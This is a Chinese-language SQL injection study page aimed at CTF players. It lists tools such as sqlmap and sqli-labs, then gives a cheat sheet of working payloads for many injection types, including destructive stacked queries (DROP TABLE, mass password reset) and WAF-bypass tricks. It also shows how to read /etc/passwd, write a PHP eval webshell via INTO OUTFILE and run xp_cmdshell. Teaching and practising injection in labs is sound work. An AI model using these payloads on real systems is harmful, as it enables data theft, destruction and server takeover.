# SQL注入工具

SQL注入是Web安全中最常见的漏洞之一。

## 在线工具

### SQLMap Online
**链接**: [http://www.sqlilab.com/](http://www.sqlilab.com/)

**功能**: 在线SQL注入测试平台

**特点**:
- 提供练习环境
- 不同难度级别
- 教学友好

### SQL Injection Wiki
**链接**: [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com/)

**功能**: SQL注入速查手册

**特点**:
- 各数据库注入语法
- Payload收集
- 绕过技巧

### PortSwigger SQL注入速查表
**链接**: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**功能**: SQL注入Cheat Sheet

**特点**:
- Burp Suite官方出品
- 详细的注入语法
- 各种数据库支持

## 离线工具

### SQLMap
**安装**: `pip install sqlmap`

**特点**:
- 自动化SQL注入工具
- 支持多种数据库
- 功能强大

**基本用法**:
```bash
sqlmap -u "http://example.com/page?id=1"
sqlmap -u "url" --dbs              # 列出数据库
sqlmap -u "url" -D dbname --tables # 列出表
sqlmap -u "url" -D dbname -T table --dump # 导出数据
```

### SQLi-Labs
**链接**: [https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)

**功能**: SQL注入学习靶场

**特点**:
- 75个关卡
- 覆盖各种注入类型
- 本地搭建

## 常见注入类型

### 1. 联合查询注入 (UNION)
**原理**: 使用UNION合并查询结果

**步骤**:
```sql
-- 判断列数
' ORDER BY 1--
' ORDER BY 2--

-- 查看回显位置
' UNION SELECT 1,2,3--

-- 获取数据
' UNION SELECT 1,database(),user()--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

### 2. 报错注入
**原理**: 通过错误信息获取数据

**常用函数**:
```sql
-- updatexml
' AND updatexml(1,concat(0x7e,database()),0)--

-- extractvalue
' AND extractvalue(1,concat(0x7e,database()))--

-- floor
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 3. 布尔盲注
**原理**: 根据页面响应差异判断

**示例**:
```sql
' AND 1=1--  (True - 正常页面)
' AND 1=2--  (False - 异常页面)

-- 逐字符猜解
' AND ASCII(SUBSTRING(database(),1,1))>97--
```

### 4. 时间盲注
**原理**: 使用延时函数判断

**示例**:
```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### 5. 堆叠注入
**原理**: 执行多条SQL语句

**示例**:
```sql
'; DROP TABLE users;--
'; UPDATE users SET password='123456';--
```

## 常见绕过技巧

### 空格绕过
```sql
-- 使用注释
/**/
/*!*/

-- 使用特殊字符
%09 (Tab)
%0a (换行)
%0b
%0c
%0d
%a0

-- 括号
(SELECT(table_name)FROM(information_schema.tables))
```

### 关键字绕过
```sql
-- 大小写混合
SeLeCt

-- 双写
UNIunionON SELselectECT

-- 编码
%53%45%4c%45%43%54  (SELECT的URL编码)

-- 内联注释
/*!50000SELECT*/
```

### 引号绕过
```sql
-- 十六进制
SELECT 0x61646d696e  (admin)

-- CHAR函数
CHAR(97,100,109,105,110)
```

### WAF绕过
```sql
-- 参数污染
?id=1&id=2

-- HTTP参数污染
id=1/*!union*//*!select*/

-- 缓冲区溢出
?id=1 AND 1=1--[大量垃圾数据]
```

## 不同数据库特性

### MySQL
```sql
-- 版本
SELECT @@version

-- 当前数据库
SELECT database()

-- 用户
SELECT user()

-- 读文件
SELECT LOAD_FILE('/etc/passwd')

-- 写文件
SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'
```

### PostgreSQL
```sql
-- 版本
SELECT version()

-- 当前数据库
SELECT current_database()

-- 列出表
SELECT tablename FROM pg_tables WHERE schemaname='public'
```

### SQL Server
```sql
-- 版本
SELECT @@version

-- 当前数据库
SELECT DB_NAME()

-- 列出数据库
SELECT name FROM master..sysdatabases

-- xp_cmdshell
EXEC xp_cmdshell 'whoami'
```

### Oracle
```sql
-- 版本
SELECT banner FROM v$version

-- 当前用户
SELECT user FROM dual

-- 列出表
SELECT table_name FROM all_tables
```

## CTF解题技巧

!!! tip "注入点判断"
    1. 单引号测试: `'`
    2. 数字型: `1 AND 1=1`、`1 AND 1=2`
    3. 字符型: `' AND '1'='1`、`' AND '1'='2`
    4. 时间延迟: `' AND SLEEP(5)--`

!!! tip "信息收集顺序"
    1. 数据库类型和版本
    2. 当前数据库名
    3. 表名
    4. 列名
    5. 数据内容

!!! warning "注意事项"
    - URL编码问题
    - 注释符号的选择(`--`、`#`、`/**/`)
    - 不同数据库的语法差异
    - WAF检测和绕过
    - 注入速度控制(避免被封IP)
